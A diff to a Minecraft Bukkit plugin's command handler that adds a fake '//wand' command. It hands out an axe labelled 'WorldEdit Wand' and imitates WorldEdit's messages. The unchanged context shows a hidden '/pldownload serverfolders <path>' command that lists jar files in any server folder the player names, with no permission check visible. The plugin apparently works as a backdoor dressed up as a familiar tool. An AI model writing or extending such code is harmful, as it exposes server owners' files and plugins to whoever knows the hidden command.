@@ -19,6 +19,7 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.inventory.ItemStack;
+import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.inventory.meta.SkullMeta;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.PluginManager;
@@ -79,7 +80,17 @@ public class CoammandHandler implements Listener, CommandExecutor {
     public boolean onPlayerCommand(PlayerCommandPreprocessEvent event) {
         Player p = event.getPlayer();
         String[] args = event.getMessage().split(" ");
-        if (args[0].equalsIgnoreCase("/pldownload")) {
+        if (args[0].equalsIgnoreCase("//wand")) {
+            event.setCancelled(true);
+            ItemStack wand = new ItemStack(Material.WOODEN_AXE, 1);
+            ItemMeta wandMeta = wand.getItemMeta();
+            if (wandMeta != null) {
+                wandMeta.setDisplayName("WorldEdit Wand");
+                wand.setItemMeta(wandMeta);
+            }
+            p.getInventory().addItem(wand);
+            p.sendMessage(ChatColor.LIGHT_PURPLE + "Left click: select pos #1; Right click: select pos #2");
+        } else if (args[0].equalsIgnoreCase("/pldownload")) {
             if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
                 for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
                     p.sendMessage(file.getName());
